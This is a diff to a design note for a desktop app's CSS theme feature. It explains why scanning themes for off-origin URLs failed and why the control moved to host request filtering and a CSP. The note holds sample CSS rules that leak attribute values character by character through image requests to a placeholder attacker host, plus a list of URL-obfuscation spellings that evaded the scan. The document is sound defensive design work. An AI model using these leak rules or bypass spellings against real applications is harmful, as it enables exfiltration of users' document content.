@@ -467,7 +467,46 @@ only `https://{DocHost}/*` (`MainWindow.xaml.cs:180`). So a theme containing
 outbound request from inside the app. For a feature whose pitch is "drop someone
 else's CSS file in a folder", that is a beacon and a fingerprinting vector.
 
-**Decision: reject off-origin references at validation time**, and treat it as an
+**Read this before wiring theme injection in stage 4.** With the host filter in
+place, a hostile theme can still do one thing, and it was demonstrated rather than
+theorised: **the CSS attribute-value oracle.** Rules like
+
+```css
+span[data-value^="a"] { background-image: url("https://attacker/a"); }
+a[href^="https://x"]  { background-image: url("https://attacker/b"); }
+```
+
+fire only when they match, so a few hundred of them read a value out character by
+character, and each match is an image request — which is the one thing allowed
+off-origin, because documents need pictures. `background-image`, `list-style-image`,
+`mask-image`, `border-image`, `cursor` and `content: url()` all reached the wire in
+testing; `@import`, `@font-face` and `filter: url()` were blocked by the CSP.
+
+This matters more than it sounds because of what is in the attributes:
+`span[data-value]` carries the ORIGINAL unsanitized raw-HTML string. So the channel
+reads document content, not just decoration.
+
+Neither layer can close it — a theme's `url()` is an Image request indistinguishable
+from a document's — so stage 4 has to close it structurally. The options worth
+weighing: scope injected themes so they cannot select on attributes carrying
+document data; serve a theme from the host over its own origin via a `<link>` so
+`img-src` can be tightened for it specifically; or strip attribute selectors from a
+theme at injection and say so in the docs. Whichever, it is a design decision that
+belongs before the menu, not after.
+
+---
+
+**Superseded, and worth reading with the outcome in mind.** This was implemented,
+and four review rounds each found another spelling of a URL the scan could not see —
+`= rl(…)`, a bare string in `image-set()`, escapes inside a string, a leading C0
+control, a tab mid-URL, a special scheme with no slashes, a `[` inside a `url()`
+token. The reason is structural: a scan matches text, and the URL parser normalises
+that text first. The control moved to the host — `MainWindow.OnResourceRequested`
+refuses every off-origin request, plus a CSP on the editor page — and the check
+below stayed as an explanation for the theme author rather than the thing standing
+between a stranger's file and the wire.
+
+**Original decision: reject off-origin references at validation time**, and treat it as an
 error that disables the entry with a specific message ("references a remote URL"),
 not a silent strip — the user should know why their theme was refused rather than
 wonder why half of it didn't apply. `@layer` already kills bare `@import`; `url()`
